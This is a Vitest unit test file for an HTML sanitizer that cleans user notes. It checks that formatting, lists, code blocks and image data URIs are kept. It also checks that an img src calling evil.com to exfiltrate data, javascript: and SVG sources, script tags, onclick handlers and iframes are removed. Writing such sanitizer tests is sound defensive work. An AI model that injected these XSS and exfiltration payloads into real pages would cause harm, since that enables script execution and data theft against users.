// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { sanitizeNoteHtml } from './sanitize';

describe('sanitizeNoteHtml', () => {
  it('preserves basic formatting tags', () => {
    const html = '<p>Hello <strong>world</strong> <em>italic</em> <u>underline</u></p>';
    const result = sanitizeNoteHtml(html);
    expect(result).toContain('<strong>world</strong>');
    expect(result).toContain('<em>italic</em>');
    expect(result).toContain('<u>underline</u>');
  });

  it('preserves list tags', () => {
    const html = '<ul><li>Item 1</li><li>Item 2</li></ul>';
    expect(sanitizeNoteHtml(html)).toContain('<ul>');
    expect(sanitizeNoteHtml(html)).toContain('<li>');
  });

  it('preserves code blocks', () => {
    const html = '<pre><code>const x = 1;</code></pre>';
    const result = sanitizeNoteHtml(html);
    expect(result).toContain('<pre>');
    expect(result).toContain('<code>');
  });

  it('preserves images with data:image/ src', () => {
    const html = '<img src="data:image/png;base64,iVBOR..." alt="screenshot">';
    const result = sanitizeNoteHtml(html);
    expect(result).toContain('data:image/png;base64,iVBOR...');
  });

  it('strips external URL img src (prevents exfiltration)', () => {
    const html = '<img src="https://evil.com/steal?data=secret" alt="test">';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('https://evil.com');
    // The img tag may still be present but without src
    expect(result).not.toContain('evil.com');
  });

  it('strips http:// img src', () => {
    const html = '<img src="http://attacker.com/img.png" alt="test">';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('attacker.com');
  });

  it('strips javascript: img src', () => {
    const html = '<img src="javascript:alert(1)" alt="test">';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('javascript:');
  });

  it('strips data: non-image src', () => {
    const html = '<img src="data:text/html,<script>alert(1)</script>">';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('data:text/html');
  });

  it('strips data:image/svg+xml src (SVG can contain scripts)', () => {
    const html = '<img src="data:image/svg+xml;base64,PHN2Zy..." alt="svg">';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('data:image/svg');
  });

  it('removes script tags', () => {
    const html = '<script>alert("xss")</script><p>Safe text</p>';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('<script>');
    expect(result).toContain('Safe text');
  });

  it('removes event handlers', () => {
    const html = '<p onclick="alert(1)">Click me</p>';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('onclick');
    expect(result).toContain('Click me');
  });

  it('removes iframe tags', () => {
    const html = '<iframe src="https://evil.com"></iframe><p>OK</p>';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('iframe');
    expect(result).toContain('OK');
  });

  it('removes style tags', () => {
    const html = '<style>body{background:red}</style><p>Text</p>';
    const result = sanitizeNoteHtml(html);
    expect(result).not.toContain('<style>');
  });

  it('preserves color and data-color attributes', () => {
    const html = '<span color="red" data-color="#ff0000">Colored</span>';
    const result = sanitizeNoteHtml(html);
    expect(result).toContain('color');
  });

  it('handles empty string', () => {
    expect(sanitizeNoteHtml('')).toBe('');
  });

  it('handles plain text (no HTML)', () => {
    const result = sanitizeNoteHtml('Just plain text');
    expect(result).toBe('Just plain text');
  });
});
